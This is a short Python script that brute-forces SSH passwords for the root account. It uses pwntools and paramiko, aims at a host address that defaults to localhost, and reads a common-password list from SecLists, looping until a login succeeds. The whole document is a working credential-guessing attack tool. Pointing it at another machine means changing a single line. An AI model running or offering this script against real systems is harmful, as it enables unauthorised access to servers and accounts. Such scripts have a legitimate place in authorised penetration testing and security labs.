# Importing necessary libraries to run the script
from pwn import *
import paramiko

host = '127.0.0.1'     # Ip of machine
username = 'root'      # Username of machine
attempts = 0           # Number of attempts

# Reading the password list. List can be downloaded from here (https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials) 
with open('ssh-common-passwords.txt', 'r') as passwords_list:
    for password in passwords_list:
        password = password.strip('\n') # Removing the new line character from the password
        try:
            # Trying to connect to the machine with the password
            print("[{}] Attempt passwords '{}'!".format(attempts, password))
            with ssh(host=host, user=username, password=password, timeout=1).connect():
                print("[+] Valid Password Found: '{}'".format(password))
                break
        except paramiko.ssh_exception.AuthenticationException:
            print("[-] Invalid Password!")

        attempts += 1   # Incrementing the number of attempts


